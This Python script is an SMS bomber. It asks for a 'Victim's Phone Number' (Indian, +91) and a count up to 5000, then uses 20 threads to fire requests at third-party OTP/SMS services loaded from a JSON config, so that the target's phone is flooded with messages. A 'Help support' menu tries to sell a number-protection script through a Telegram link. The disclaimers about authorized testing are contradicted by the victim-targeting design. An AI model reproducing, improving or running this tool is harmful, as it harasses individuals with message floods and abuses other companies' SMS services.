#!/usr/bin/env python3
import os
import sys
import json
import time
import threading
import webbrowser
from queue import Queue
import requests
import subprocess  # <--- ADDED: Required for xdg-open
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm

console = Console()

CONFIG = "assets/krishn/xxx/madrchod/services.json"
MAX_SMS = 5000
THREADS = 20

# ------------------- Full Original Banner (ANSI) -------------------
def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print(Panel.fit(
        "[bold bright_cyan]███████╗███╗   ███╗███████╗\n"
        "██╔════╝████╗ ████║██╔════╝\n"
        "███████╗██╔████╔██║███████╗\n"
        "╚════██║██║╚██╔╝██║╚════██║\n"
        "███████║██║ ╚═╝ ██║███████║\n"
        "╚══════╝╚═╝     ╚═╝╚══════╝[/bold bright_cyan]\n\n"
        "[bold yellow]S M S[/bold yellow]  [bold green]•  BY : [KRISHN] [/bold green]\n"
        "[dim]Educational / authorized testing interface[/dim]",
        title="[bold magenta]SMS[/bold magenta]",
        border_style="bright_cyan", padding=(1, 4)))
    console.print("[bold cyan]Owner:[/bold cyan] [red]KRISHN[/red]    [bold cyan]Version:[/bold cyan] [white]2.0.0[/white]")
    console.print("[dim]Use only with explicit permission.[/dim]\n")


def about():
    import platform
    device = platform.node() or "Unknown"
    system = f"{platform.system()} {platform.release()}"
    console.print(Panel(
        "[bold bright_cyan]SMS — ABOUT[/bold bright_cyan]\n\n"
        "[bold yellow]Owner[/bold yellow]   : KRISH\n"
        "[bold yellow]Version[/bold yellow] : 2.0.0\n"
        f"[bold yellow]Device[/bold yellow]  : {device}\n"
        f"[bold yellow]System[/bold yellow]  : {system}\n\n"
        "[bold magenta]OWNER LINKS[/bold magenta]\n"
        "Instagram     : [cyan]@ur_.krishn._02[/cyan]\n"
        "Telegram      : [cyan]@krishn18[/cyan]\n"
        "Telegram group.  : [cyan]@vasu90[/cyan]\n"
        "GitHub        : [cyan]kalidrod[/cyan]\n\n"
        "[dim]Replace the placeholders with your real links.[/dim]",
        title="About / Device", border_style="bright_magenta"))
    input("\nPress Enter...")


# ------------------- Helper Functions -------------------
def load_services():
    with open(CONFIG, 'r') as f:
        return json.load(f)['services']

def format_phone(phone, fmt):
    p = str(phone).strip()
    if fmt == "with_plus91":
        return f"+91{p}"
    if fmt == "91-":
        return f"91-{p}"
    return p

def send_request(svc, phone):
    method = svc['method'].upper()
    url = svc['url'].replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw')))
    headers = svc.get('headers', {}).copy()
    data = svc.get('data')
    if data:
        data = json.loads(json.dumps(data).replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw'))))
    try:
        if method == 'GET':
            r = requests.get(url, headers=headers, timeout=5)
        elif method == 'POST':
            r = requests.post(url, headers=headers, json=data, timeout=5)
        elif method == 'PUT':
            r = requests.put(url, headers=headers, json=data, timeout=5)
        else:
            return False
        return r.status_code < 500
    except:
        return False

def bomb(phone, total):
    services = load_services()
    tasks = []
    while len(tasks) < total:
        tasks.extend(services)
    tasks = tasks[:total]
    q = Queue()
    for t in tasks:
        q.put(t)
    results = []
    
    def worker():
        while not q.empty():
            svc = q.get()
            ok = send_request(svc, phone)
            results.append((svc['name'], ok))
            q.task_done()
    
    threads = [threading.Thread(target=worker) for _ in range(THREADS)]
    for t in threads:
        t.start()
    q.join()
    return results

# ------------------- Help Upsell (UPDATED) -------------------
def protect_number():
    console.print(Panel.fit(
        "[bold red]Number protection is only available in the Help support script.[/bold red]\n"
        "Get it from the developer.",
        title="Help support Feature",
        border_style="red"
    ))
    if Confirm.ask("[bold yellow]Do you want to buy the Help support script?[/bold yellow]"):
        url = "https://t.me/krishn18?text=SMS%20Install Error 🚀"
        
        # Try using xdg-open first (Standard on Linux)
        try:
            subprocess.run(['xdg-open', url], check=True)
            console.print("[green]Opening Telegram via system default...[/green]")
        except (FileNotFoundError, subprocess.CalledProcessError):
            # Fallback to python webbrowser if xdg-open fails or doesn't exist (Windows/Mac)
            console.print("[yellow]xdg-open failed or not found. Trying default web browser...[/yellow]")
            webbrowser.open(url)
    else:
        console.print("[blue]Returning to menu.[/blue]")
    input("\nPress Enter...")

# ------------------- Bombing with Progress -------------------
def start_bombing():
    console.print(Panel.fit("[bold cyan]Start Bombing[/bold cyan]", border_style="cyan"))
    phone = Prompt.ask("[bold green]Enter Victim's Phone Number[/bold green] (without +91)", default="")
    if len(phone) != 10 or not phone.isdigit():
        console.print("[red]Invalid! Must be 10 digits.[/red]")
        input("Press Enter...")
        return
    try:
        total = int(Prompt.ask("[bold green]SMS count[/bold green]", default="100"))
        if total <= 0 or total > MAX_SMS:
            raise ValueError
    except:
        console.print(f"[red]Count must be between 1 and {MAX_SMS}.[/red]")
        input("Press Enter...")
        return
    
    console.print(f"\n[yellow]Bombing [bold]{phone}[/bold] with {total} SMS...[/yellow]")
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Sending...", total=total)
        start_time = time.time()
        results = bomb(phone, total)
        progress.update(task, completed=total)
    
    elapsed = time.time() - start_time
    success = sum(1 for _, ok in results if ok)
    
    result_table = Table(title="Bombing Report", style="green")
    result_table.add_column("Metric", style="cyan")
    result_table.add_column("Value", style="white")
    result_table.add_row("Time taken", f"{elapsed:.1f} seconds")
    result_table.add_row("Total SMS", str(total))
    result_table.add_row("Successful", f"[green]{success}[/green]")
    result_table.add_row("Failed", f"[red]{total - success}[/red]")
    console.print(result_table)
    input("\nPress Enter...")

# -------------------SMS-------------------
def menu():
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        banner()
        console.print(Panel.fit("[bold yellow]SMS NUMBER [/bold yellow]", border_style="yellow"))
        console.print("1. [green]Start SMS Test[/green]")
        console.print("2. [yellow]Help support [/yellow]")
        console.print("3. [bright_cyan]About / Device / Owner Links[/bright_cyan]")
        console.print("4. [red]Exit[/red]")
        choice = Prompt.ask("[bold cyan]Select option[/bold cyan]", choices=["1","2","3","4"])
        if choice == "1":
            start_bombing()
        elif choice == "2":
            protect_number()
        elif choice == "3":
            about()
        elif choice == "4":
            console.print("\n[bold red]Exiting SMS...[/bold red]")
            break

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        console.print("\n[red]Interrupted. Exiting...[/red]")
